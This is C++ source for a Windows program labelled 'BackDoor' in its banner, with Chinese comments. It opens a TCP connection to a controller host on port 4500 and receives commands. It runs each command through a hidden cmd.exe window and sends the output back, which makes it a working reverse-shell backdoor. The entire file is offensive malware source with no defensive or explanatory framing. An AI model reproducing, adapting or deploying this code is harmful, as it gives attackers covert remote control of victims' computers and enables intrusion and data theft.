// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<winsock2.h>
#include<stdio.h>

#pragma comment(lib,"ws2_32.lib")

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n"; 
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	//初始化winsocket库
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	//建立socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf(" socket error \n");
		return 0;
	}
	
	sockaddr_in sin; 
	//填充sockaddr_in结构
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	//连接控制者电脑
	if(connect(s, (sockaddr*)&sin, sizeof(sin)) == -1)
	{
		printf(" connect error \n");
		return 0;
	}
	//发送欢迎信息
	if (send(s,wMessage,strlen(wMessage),0)==SOCKET_ERROR)
	{
        printf("Send message error \n");
        return 0;
	}
	char rBuffer[1024] = {0};
	char cmdline[256]={0};
	//循环，用于接受命令，创建进程执行，并从管道中读出执行结果返回给远程主机
	while(true)
	{
		memset(cmdline,0,256);
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead,&hWrite,&sa,0)) 
		{
			printf("CreatePipe Error");
			return 0;
		} 	
		STARTUPINFO si;
		PROCESS_INFORMATION pi; 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si); 
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		
		GetSystemDirectory(cmdline,sizeof(cmdline));
		strcat(cmdline,"\\cmd.exe /c");
		char cmdbuff[256];
		
		int   rLen=recv(s,cmdbuff,256,NULL);
		if(rLen==SOCKET_ERROR)
			return 0; 
		strncat(cmdline,cmdbuff,strlen(cmdbuff)); 
		if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
		{
			printf("CreateProcess Error");
			continue;
		}
		
		CloseHandle(hWrite);
		DWORD dwRead;
		while(ReadFile(hRead,rBuffer,1024,&dwRead,NULL))
		{  
			send(s,rBuffer,strlen(rBuffer),0);
			memset(rBuffer,0,1024);
			
		}		
	}
	return 0;
}
